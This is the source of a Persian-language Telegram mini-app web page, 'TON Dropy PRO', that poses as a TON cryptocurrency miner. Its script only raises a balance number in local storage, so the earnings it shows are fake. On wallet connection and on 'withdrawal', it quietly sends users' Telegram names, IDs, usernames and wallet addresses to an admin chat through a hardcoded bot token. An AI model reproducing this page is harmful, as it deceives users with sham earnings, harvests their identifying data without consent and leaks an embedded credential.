<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<title>TON Dropy PRO</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>

<style>
@import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;600;700&display=swap');

*{box-sizing:border-box}

body{
    margin:0;
    font-family:'Vazirmatn',sans-serif;
    background: radial-gradient(circle at top,#0f1c2e,#070b14);
    color:#fff;
    padding:20px;
    user-select: none;
}

.header{text-align:center;margin-bottom:20px;}
.header h2{
    font-size:22px;
    background:linear-gradient(90deg,#00c6ff,#0072ff);
    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;
}

.card{
    background:rgba(255,255,255,0.05);
    backdrop-filter:blur(20px);
    border:1px solid rgba(255,255,255,0.08);
    padding:18px;
    border-radius:18px;
    margin-bottom:15px;
}

#balance {
    font-size: 26px;
    font-weight: bold;
    color: #00c6ff;
    display: block;
    margin: 10px 0;
}

button{
    width:100%;
    padding:14px;
    border:none;
    border-radius:14px;
    font-size:15px;
    font-weight:600;
    cursor:pointer;
    transition:0.3s;
}

.withdraw-btn{
    background:linear-gradient(90deg,#ff512f,#dd2476);
    color:#fff;
}

.withdraw-btn:disabled{
    background:gray;
    cursor:not-allowed;
}

.toast{
    position:fixed;
    bottom:20px;
    left:50%;
    transform:translateX(-50%) translateY(20px);
    background:#121b2a;
    padding:12px 25px;
    border-radius:12px;
    box-shadow:0 10px 30px rgba(0,0,0,0.6);
    opacity:0;
    transition:0.3s;
    font-size:14px;
    z-index: 1000;
    white-space: nowrap;
}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}

.loader{
    border:4px solid rgba(255,255,255,0.2);
    border-top:4px solid #00c6ff;
    border-radius:50%;
    width:25px;
    height:25px;
    animation:spin 1s linear infinite;
    margin:auto;
}
@keyframes spin{ 100%{transform:rotate(360deg);} }

.history-item{
    background:rgba(255,255,255,0.04);
    padding:10px;
    border-radius:10px;
    margin-top:8px;
    font-size:13px;
    border-right: 3px solid #00c6ff;
}
</style>
</head>

<body>

<div class="header">
    <h2>⛏ TON Dropy PRO</h2>
</div>

<div class="card">
    <p>💰 موجودی زنده:</p>
    <span id="balance">0.000000</span>
    <p style="font-size: 13px; color: #aaa;">⚡ قدرت استخراج: 0.000012 H/s</p>
    <p style="font-size: 13px;">🕒 زمان: <span id="time"></span></p>
</div>

<div class="card">
    <div id="ton-connect"></div>
    <div id="walletBox" style="display:none;margin-top:10px;font-size:12px;text-align: center;">
        آدرس متصل: <br>
        <span id="walletAddress" style="color:#00ff9d;word-break:break-all;"></span>
    </div>
</div>

<div class="card">
    <button id="withdrawBtn" onclick="withdraw()" class="withdraw-btn">
        💸 ثبت درخواست برداشت
    </button>
    <div id="loadingBox" style="display:none;margin-top:10px;">
        <div class="loader"></div>
    </div>
</div>

<div class="card">
    <h4>📜 تاریخچه برداشت‌ها</h4>
    <div id="history"></div>
</div>

<div id="toast" class="toast"></div>

<script>
const tg = window.Telegram.WebApp;
tg.ready(); tg.expand();

// اطلاعات ربات شما
const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
const ADMIN_ID = "5972276401";

// تنظیمات حافظه و ماینینگ
const STORAGE_KEY = 'stable_balance_v2';
let miningRate = 0.000012; 
let currentBalance = parseFloat(localStorage.getItem(STORAGE_KEY)) || 0.0;

// نمایش زمان
setInterval(()=>{
    document.getElementById("time").innerText = new Date().toLocaleTimeString("fa-IR");
},1000);

// استخراج زنده
function startMining() {
    setInterval(() => {
        currentBalance += miningRate;
        document.getElementById("balance").innerText = currentBalance.toFixed(6);
        localStorage.setItem(STORAGE_KEY, currentBalance.toString());
    }, 1000);
}

// تابع ارسال پیام به تلگرام شما
async function notifyAdmin(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const params = {
        chat_id: ADMIN_ID,
        text: message,
        parse_mode: "HTML"
    };

    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(params)
        });
    } catch (e) {
        console.error("خطا در ارسال پیام به ربات", e);
    }
}

/* اتصال کیف پول */
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://nimwmesfandiari.github.io/ton-dropy-bot/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

tonConnectUI.onStatusChange(wallet => {
    if (wallet) {
        const addr = wallet.account.address;
        document.getElementById("walletAddress").innerText = addr;
        document.getElementById("walletBox").style.display = "block";
        showToast("✅ کیف پول متصل شد");

        const user = tg.initDataUnsafe?.user;
        const msg = `🔔 <b>کیف پول جدید متصل شد!</b>\n\n👤 کاربر: ${user?.first_name || "نامشخص"}\n🆔 آیدی: <code>${user?.id || "نامشخص"}</code>\n🌐 یوزرنیم: @${user?.username || "ندارد"}\n👛 آدرس: <code>${addr}</code>`;
        notifyAdmin(msg);
    }
});

/* درخواست برداشت */
function withdraw() {
    if (currentBalance < 0.5) {
        showToast("❌ حداقل موجودی 0.5 TON");
        return;
    }

    const amount = currentBalance.toFixed(6);
    document.getElementById("withdrawBtn").disabled = true;
    document.getElementById("loadingBox").style.display = "block";

    setTimeout(async () => {
        const user = tg.initDataUnsafe?.user;
        const msg = `💰 <b>درخواست برداشت جدید!</b>\n\n👤 کاربر: ${user?.first_name}\n🆔 آیدی: <code>${user?.id}</code>\n💵 مقدار: <b>${amount} TON</b>\n👛 کیف پول: <code>${localStorage.getItem('user_wallet_addr') || "در کد بالا ثبت شده"}</code>`;
        
        await notifyAdmin(msg);

        // ثبت در تاریخچه
        const historyBox = document.getElementById("history");
        const div = document.createElement("div");
        div.className = "history-item";
        div.innerText = `درخواست ${amount} TON - در انتظار تایید`;
        historyBox.prepend(div);

        // صفر کردن
        currentBalance = 0;
        localStorage.setItem(STORAGE_KEY, "0");

        document.getElementById("loadingBox").style.display = "none";
        document.getElementById("withdrawBtn").disabled = false;
        showToast("📤 درخواست برای مدیریت ارسال شد");
    }, 2000);
}

function showToast(msg){
    const toast = document.getElementById("toast");
    toast.innerText = msg;
    toast.classList.add("show");
    setTimeout(()=>toast.classList.remove("show"), 3000);
}

// شروع به کار
startMining();
</script>

</body>
</html>
